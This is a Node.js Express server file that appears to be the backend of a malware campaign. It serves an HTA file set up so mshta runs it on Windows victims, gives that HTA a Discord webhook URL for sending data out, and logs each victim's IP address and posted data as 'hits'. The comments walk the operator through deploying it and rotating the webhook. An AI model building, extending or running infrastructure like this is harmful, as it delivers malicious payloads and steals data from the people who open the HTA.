// language: JavaScript, file: server.js, runtime: Node 18+, deps: express
const express = require("express");
const path = require("path");
const fs = require("fs");

const app = express();

// Trust proxy is required if you are behind Cloudflare/Nginx so you get real IPs
app.set("trust proxy", 1);

// Parse incoming JSON payloads from the HTA
app.use(express.json({ limit: "2mb" }));

// 1. SERVE THE HTA (Fixes the mshta error)
app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "file.hta");
  // Set to text/html so mshta parses it directly instead of trying to download it
  res.type("text/html");
  res.sendFile(filePath);
});

// 2. WEBHOOK ROUTE (The HTA fetches this at startup)
// Replace the URL below with your NEW, ROTATED Discord webhook.
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/YOUR_NEW_ID/YOUR_NEW_TOKEN";

app.get("/wh", (req, res) => {
  res.type("text/plain").send(DISCORD_WEBHOOK);
});

// 3. RECEIVER ROUTE (If you want to log hits to your server instead of/in addition to Discord)
app.post("/log", (req, res) => {
  const entry = {
    time: new Date().toISOString(),
    ip: req.ip,
    data: req.body
  };
  
  // Save to hits.log on your server
  fs.appendFileSync(path.join(__dirname, "hits.log"), JSON.stringify(entry) + "\n");
  
  res.sendStatus(204); // Tell the HTA it succeeded
});

const PORT = 8080;
app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running on port ${PORT}`);
});
